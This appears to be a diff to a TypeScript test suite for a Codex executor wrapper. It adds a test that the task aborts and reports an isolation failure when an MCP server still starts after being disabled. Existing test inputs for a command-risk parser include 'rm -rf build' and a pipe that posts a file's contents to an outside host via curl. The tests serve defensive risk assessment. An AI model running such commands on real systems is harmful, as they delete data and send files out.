@@ -25,14 +25,15 @@ interface Drive {
 
 async function drive(
   script: Step[],
-  o: { mcp?: string[] | Error; decide?: (r: PermissionRequest) => Decision; timeoutMs?: number; stopWhen?: (e: ExecutorEvent) => boolean } = {},
+  o: { leak?: string; mcp?: string[] | Error; decide?: (r: PermissionRequest) => Decision; timeoutMs?: number; stopWhen?: (e: ExecutorEvent) => boolean } = {},
 ): Promise<Drive> {
   const cwd = await tmpDir('codex-fake-');
   const rec = path.join(cwd, '..', `rec-${path.basename(cwd)}.jsonl`);
   const ex = new CodexExecutor({
     command: process.execPath,
     prefixArgs: [FAKE_SERVER],
-    env: { FAKE_APP_SCRIPT: JSON.stringify(script), FAKE_RECORD: rec },
+    env: { FAKE_APP_SCRIPT: JSON.stringify(script), FAKE_RECORD: rec, ...(o.leak ? { FAKE_MCP_LEAK: o.leak } : {}) },
+    mcpSettleMs: 100,
     discoverMcpServers: async () => {
       if (o.mcp instanceof Error) throw o.mcp;
       return o.mcp ?? ['context7', 'my server'];
@@ -307,5 +308,12 @@ describe('命令解析（风险评估的输入）', () => {
   it('多段命令取最危险的一段', () => {
     expect(parseCommand('/bin/zsh -lc "ls && rm -rf build"')).toMatchObject({ argv: ['rm', '-rf', 'build'], complex: true });
     expect(parseCommand('/bin/zsh -lc "cat a | curl -d @- http://x"').argv[0]).toBe('curl');
+  });
+
+  it('隔离核对：关闭后仍有 MCP 服务器启动 → 中止任务，不开始回合，如实报告', async () => {
+    const d = await drive([{ say: '不应该执行' }], { leak: 'github' });
+    expect(d.exit).toMatchObject({ kind: 'exited', code: 1 });
+    expect(JSON.stringify(d.events)).toContain('隔离失败');
+    expect(d.record.some((r) => r.kind === 'recv' && r.msg?.method === 'turn/start')).toBe(false);
   });
 });
